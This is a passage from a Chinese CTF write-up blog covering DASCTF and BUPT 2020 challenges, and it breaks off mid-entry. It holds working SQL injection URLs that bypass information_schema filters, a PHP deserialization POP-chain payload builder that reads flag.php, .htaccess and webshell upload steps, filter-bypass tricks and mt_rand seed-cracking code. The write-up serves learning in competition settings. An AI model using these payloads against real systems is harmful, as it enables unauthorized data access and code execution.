<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">http://<span class="number">183.129</span><span class="number">.189</span><span class="number">.60</span>:<span class="number">10004</span>/?id=<span class="number">100</span>%<span class="number">27</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">SELECT</span><span class="comment">/**/</span>group_concat(<span class="built_in">table_name</span>),<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">FROM</span><span class="comment">/**/</span><span class="comment">/**/</span>sys.x$schema_flattened_keys<span class="comment">/**/</span><span class="keyword">WHERE</span><span class="comment">/**/</span>table_schema=<span class="string">'sqlidb'</span><span class="comment">/**/</span><span class="keyword">GROUP</span><span class="comment">/**/</span><span class="keyword">BY</span><span class="comment">/**/</span><span class="built_in">table_name</span><span class="comment">/**/</span><span class="keyword">limit</span><span class="comment">/**/</span><span class="number">0</span>,<span class="number">1</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>获取flag</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="keyword">http</span>://<span class="number">183.129</span><span class="number">.189</span><span class="number">.60</span>:<span class="number">10004</span>/?id=<span class="number">100</span>’<span class="comment">/**/</span><span class="built_in">union</span><span class="comment">/**/</span>select<span class="comment">/**/</span>*,<span class="number">1</span><span class="comment">/**/</span><span class="built_in">from</span><span class="comment">/**/</span>flllaaaggg%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>记录一下bypass information_schema的库</p>
<figure class="highlight xl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">host_summary</span> -&gt;</span> host、total_connections	历史连接IP、对应IP的连接次数</span><br><span class="line"> <span class="function"><span class="title">innodb_buffer_stats_by_schema</span> -&gt;</span> object_schema	库名</span><br><span class="line"> <span class="function"><span class="title">innodb_buffer_stats_by_table</span> -&gt;</span> object_schema、object_name	库名、表名(可指定)</span><br><span class="line"> <span class="function"><span class="title">io_global_by_file_by_bytes</span> -&gt;</span> file	路径中包含库名</span><br><span class="line"> <span class="function"><span class="title">io_global_by_file_by_latency</span> -&gt;</span> file	路径中包含库名</span><br><span class="line"> <span class="function"><span class="title">processlist</span> -&gt;</span> current_statement、last_statement	当前数据库正在执行的语句、该句柄执行的上一条语句</span><br><span class="line"> <span class="function"><span class="title">schema_auto_increment_columns</span> -&gt;</span> table_schema、table_name、column_name	库名、表名、列名</span><br><span class="line"> <span class="function"><span class="title">schema_index_statistics</span> -&gt;</span> table_schema、table_name	库名、表名</span><br><span class="line"> <span class="function"><span class="title">schema_object_overview</span> -&gt;</span> db	库名</span><br><span class="line"> <span class="function"><span class="title">schema_table_statistics</span> -&gt;</span> table_schema、table_name	库名、表名</span><br><span class="line"> <span class="function"><span class="title">schema_table_statistics_with_buffer</span> -&gt;</span> table_schema、table_name	库名、表名</span><br><span class="line"> <span class="function"><span class="title">schema_tables_with_full_table_scans</span> -&gt;</span> object_schema、object_name	库名、表名(全面扫描访问)</span><br><span class="line"> <span class="function"><span class="title">session</span> -&gt;</span> current_statement、last_statement	当前数据库正在执行的语句、该句柄执行的上一条语句</span><br><span class="line"> <span class="function"><span class="title">statement_analysis</span> -&gt;</span> query、db	数据库最近执行的请求、对于请求访问的数据库名</span><br><span class="line"> <span class="function"><span class="title">statementswith</span>* -&gt;</span> query、db	数据库最近执行的特殊情况的请求、对应请求的数据库</span><br><span class="line"> <span class="function"><span class="title">version</span> -&gt;</span> mysql_version	mysql版本信息</span><br><span class="line"> x$innodb_buffer_stats_by_schema	同innodb_buffer_stats_by_schema</span><br><span class="line"> x$innodb_buffer_stats_by_table	同innodb_buffer_stats_by_table</span><br><span class="line"> x$io_global_by_file_by_bytes	同io_global_by_file_by_bytes</span><br><span class="line"> <span class="function"><span class="title">x</span>$schema_flattened_keys -&gt;</span> table_schema、table_name、index_columns	库名、表名、主键名</span><br><span class="line"> <span class="function"><span class="title">x</span>$ps_schema_table_statistics_io -&gt;</span> table_schema、table_name、count_read	库名、表名、读取该表的次数</span><br></pre></td></tr></table></figure>

<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="1-welcome-to-the-misc-world"><a href="#1-welcome-to-the-misc-world" class="headerlink" title="1.welcome to the misc world"></a>1.welcome to the misc world</h3><p>和北邮校赛的一道题挺类似的，LSB隐写。可以用<a href="https://0xcreed.jxustctf.top/2020/03/2020%E5%8C%97%E9%82%AE%E6%A0%A1%E8%B5%9B/#3-Hello-misc">脚本</a>也可以用<code>zsteg</code>,分离得到一张包含密码的图片。</p>
<p><img src="/2020/07/DASCTF-7月赛/image-20200726181457308.png" alt="image-20200726181457308"></p>
<p>得到密码: <code>/*///1258/*/@#</code></p>
<p>解压后得到hint.png和7.png。hint.png最后有一串base64字符串，解码后是Unicode</p>
<p>![批注 2020-07-25 104650](DASCTF-7月赛/批注 2020-07-25 104650.jpg)</p>
<p>社会主义核心价值观解码</p>
<p>![批注 2020-07-25 105244](DASCTF-7月赛/批注 2020-07-25 105244.jpg)</p>
<p>找了很久没有找到疑似base85的字符串</p>
<p>最后7z打开压缩包 。。。NTFS隐写</p>
<p>![批注 2020-07-25 113101](DASCTF-7月赛/批注 2020-07-25 113101.jpg)</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WEB</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2020北邮校赛</title>
    <url>/2020/03/2020%E5%8C%97%E9%82%AE%E6%A0%A1%E8%B5%9B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-Ez-bypass"><a href="#1-Ez-bypass" class="headerlink" title="1.Ez_bypass"></a>1.Ez_bypass</h3><p>打开网页直接有源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$flag=<span class="string">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'gg'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">    $id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">'gg'</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'You got the first step'</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>]))</span><br><span class="line">                &#123;</span><br><span class="line">                    $passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line">                    <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                                &#123;   <span class="keyword">echo</span> <span class="string">'Good Job!'</span>;</span><br><span class="line">                                    highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">                                    <span class="keyword">die</span>(<span class="string">'By Retr_0'</span>);</span><br><span class="line">                                &#125;</span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                                &#123;</span><br><span class="line">                                    <span class="keyword">echo</span> <span class="string">"can you think twice??"</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">'You can not get it !'</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'only one way to get the flag'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You are not a real hacker!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Please input first'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a>


<p>第一层md5绕过可以用数组或者<a href="https://xz.aliyun.com/t/2232" target="_blank" rel="noopener">md5碰撞</a>,第二层弱类型比较直接在1234567后面加个非数字字符就行</p>
<p><img src="/2020/03/2020北邮校赛/image-20200327185855883.png" alt="image-20200327185855883"></p>
<p>我这加了个空格(那个0可以无视了 -_-!)</p>
<h3 id="2-PYWebsite"><a href="#2-PYWebsite" class="headerlink" title="2.PYWebsite"></a>2.PYWebsite</h3><p>打开网站花里胡哨的，直接看源码</p>
<p><img src="/2020/03/2020北邮校赛/image-20200327205601093.png" alt="image-20200327205601093"></p>
<p>直接看flag.php页面</p>
<p><img src="/2020/03/2020北邮校赛/image-20200327205642253.png" alt="image-20200327205642253"></p>
<p>根据提示应该是改XFF头</p>
<p><img src="/2020/03/2020北邮校赛/image-20200327205656797.png" alt="image-20200327205656797"></p>
<h3 id="3-你传你🐎呢"><a href="#3-你传你🐎呢" class="headerlink" title="3.你传你🐎呢"></a>3.你传你🐎呢</h3><p>先上传.htaccess，文件内容： SetHandler application/x-httpd-php </p>
<p><img src="/2020/03/2020北邮校赛/image-20200327202846073.png" alt="image-20200327202846073"></p>
<p>接着上传马</p>
<p><img src="/2020/03/2020北邮校赛/image-20200327202924100.png" alt="image-20200327202924100"></p>
<p>这个马挂了代理才连上 吐了</p>
<p><img src="/2020/03/2020北邮校赛/image-20200327202736128.png" alt="image-20200327202736128"></p>
<h3 id="4-Ezpop"><a href="#4-Ezpop" class="headerlink" title="4.Ezpop"></a>4.Ezpop</h3><p>直接有源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'pop'</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">'pop'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>常见的魔术方法</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">__construct</span>()，类的构造函数，当对象创建时会自动调用(但在unserialize()时是不会自动调用的)。</span><br><span class="line"><span class="selector-tag">__wakeup</span>() <span class="comment">//使用unserialize时触发</span></span><br><span class="line"><span class="selector-tag">__sleep</span>() <span class="comment">//使用serialize时触发</span></span><br><span class="line"><span class="selector-tag">__destruct</span>() <span class="comment">//对象被销毁时触发</span></span><br><span class="line"><span class="selector-tag">__call</span>() <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="selector-tag">__callStatic</span>() <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="selector-tag">__get</span>() <span class="comment">//用于从不可访问的属性读取数据</span></span><br><span class="line"><span class="selector-tag">__set</span>() <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line"><span class="selector-tag">__isset</span>() <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line"><span class="selector-tag">__unset</span>() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line"><span class="selector-tag">__toString</span>() <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line"><span class="selector-tag">__invoke</span>() <span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure>

<p>__toString 触发的条件比较多</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">(<span class="number">1</span>)echo ($obj) / print($obj) 打印时会触发</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)反序列化对象与字符串连接时</span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>)反序列化对象参与格式化字符串时</span><br><span class="line"></span><br><span class="line">(<span class="number">4</span>)反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型）</span><br><span class="line"></span><br><span class="line">(<span class="number">5</span>)反序列化对象参与格式化SQL语句，绑定参数时</span><br><span class="line"></span><br><span class="line">(<span class="number">6</span>)反序列化对象在经过php字符串函数，如 strlen()、addslashes()时</span><br><span class="line"></span><br><span class="line">(<span class="number">7</span>)在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有toString返回的字符串的时候toString会被调用</span><br><span class="line"></span><br><span class="line">(<span class="number">8</span>)反序列化的对象作为 class_exists() 的参数的时候</span><br></pre></td></tr></table></figure>

<p>关键在<code>Modifier</code>类，如果$var为伪协议那么可读flag.php。要触发<code>Modifier的 __invoke()</code> 就必须触发<code>Test的__get()</code> ,要触发<code>Test的__get()</code> 就必须访问<code>Test中一个不能访问的类成员</code> 。而在<code>Show</code> 中的<code>__toSting</code> 方法<code>$this-&gt;str-&gt;source</code> 明显是不能访问的。所以构造如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var= <span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> Show();</span><br><span class="line">$a-&gt;source = <span class="keyword">new</span> Show();</span><br><span class="line">$a-&gt;source-&gt;str =<span class="keyword">new</span> Test();</span><br><span class="line">$a-&gt;source-&gt;str-&gt;p=<span class="keyword">new</span> Modifier();</span><br><span class="line"></span><br><span class="line">$b=serialize($a);</span><br><span class="line"><span class="keyword">echo</span>(urlencode($b));</span><br></pre></td></tr></table></figure>

<h3 id="5-套娃"><a href="#5-套娃" class="headerlink" title="5.套娃"></a>5.套娃</h3><p>第一层</p>
<p><img src="/2020/03/2020北邮校赛/image-20200328143848747.png" alt="image-20200328143848747"></p>
<p>这里第一个主要是匹配了<code>_</code>，因为$_SERVER[‘QUERY_STRING’]不会urldecode所以一般套路是可以URL编码，但是本题目ban掉了<code>_</code>的编码值<code>%5f</code> 绕过方法：</p>
<ol>
<li>%5F</li>
<li>b.u.p.t（点代替_）</li>
<li>b u p t（空格代替_）</li>
</ol>
<p>第二个用换行符%0a绕过</p>
<p><img src="/2020/03/2020北邮校赛/image-20200328143918754.png" alt="image-20200328143918754"></p>
<p>访问secrettw.php没啥特别的就抓包看了下</p>
<p><img src="/2020/03/2020北邮校赛/image-20200328144148256.png" alt="image-20200328144148256"></p>
<p>放到控制台跑了一下</p>
<p><img src="/2020/03/2020北邮校赛/image-20200328144220283.png" alt="image-20200328144220283"></p>
<p>有了提示就好办，但要注意因为之前是抓的GET包所以headers要加上content-type这个字段或者直接用Hackbar</p>
<figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line">get请求的headers中没有content-<span class="keyword">type</span>这个字段，post 的 content-<span class="keyword">type</span> 有两种 ：</span><br><span class="line"></span><br><span class="line">application/x-www-<span class="keyword">form</span>-urlencoded </span><br><span class="line">这种就是一般的文本表单</span><br><span class="line">multipart/<span class="keyword">form</span>-<span class="keyword">data</span> </span><br><span class="line">文件表单的传输</span><br></pre></td></tr></table></figure>

<p>POST Merak后会有源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Flag is here~But how to get it? <span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'takeip.php'</span>;</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'.'</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'Merak'</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span><span class="params">($v)</span></span>&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = <span class="string">''</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Local access only!'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">'127.0.0.1'</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Sorry,you don't have permission!  Your ip is :"</span>.$ip;</span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">'127.0.0.1'</span> &amp;&amp; file_get_contents($_GET[<span class="string">'2333'</span>]) === <span class="string">'todat is a happy day'</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Your REQUEST is:"</span>.change($_GET[<span class="string">'file'</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">'file'</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>$ip是通过getIp()获取IP但具体不知道通过什么判断的只能猜了</p>
<p>1.Client-IP</p>
<p>2.X-Forwarded-For</p>
<p>3.X-Real-IP</p>
<p>对于file_get_contents可以利用<code>data://</code>伪协议绕过或者<code>php://input</code> 绕过</p>
<p><code>change</code>改变了我们传入的file参数，所以传入前先加密file</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dechage</span><span class="params">($v)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    $re = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123;</span><br><span class="line">        $re .= chr ( ord ($v[$i]) - $i*<span class="number">2</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode($re);</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">print</span>(unchage($a));</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/2020北邮校赛/image-20200411223358460.png" alt="image-20200411223358460"></p>
<p><img src="/2020/03/2020北邮校赛/image-20200328233109846.png" alt="image-20200328233109846"></p>
<h3 id="6-Ezaudit"><a href="#6-Ezaudit" class="headerlink" title="6.Ezaudit"></a>6.Ezaudit</h3><p>直接扫目录，发现源码</p>
<p><img src="/2020/03/2020北邮校赛/image-20200411225633366.png" alt="image-20200411225633366"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">'Content-type:text/html; charset=utf-8'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'login'</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">    $Private_key = $_POST[<span class="string">'Private_key'</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == <span class="string">''</span>) || ($password == <span class="string">''</span>) ||($Private_key == <span class="string">''</span>)) &#123;</span><br><span class="line">        <span class="comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span></span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($Private_key != <span class="string">'*************'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($Private_key === <span class="string">'************'</span>)&#123;</span><br><span class="line">        $getuser = <span class="string">"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'"</span>.<span class="string">';'</span>; </span><br><span class="line">        $link=mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">        mysql_select_db(<span class="string">"test"</span>,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        <span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;"</span>.$row[<span class="string">"username"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>.$row[<span class="string">"flag"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// genarate public_key </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  <span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???</span></span><br></pre></td></tr></table></figure>

<p>这里主要是要比较这个私钥，题目给了公钥，可以发现他们都是<code>mt_rand()</code>生成的。所以只要用公钥去还原种子，然后再手工算出私钥即可</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *str1 = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *str2 = <span class="string">"KVQP0LdJKRaV3n9D"</span>; <span class="comment">//公钥</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(str2) ; i++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(str1) ; j++) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( str2[i] == str1[j] ) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%d %d 0 %d "</span>, j, j, <span class="built_in">strlen</span>(str1)<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果</p>
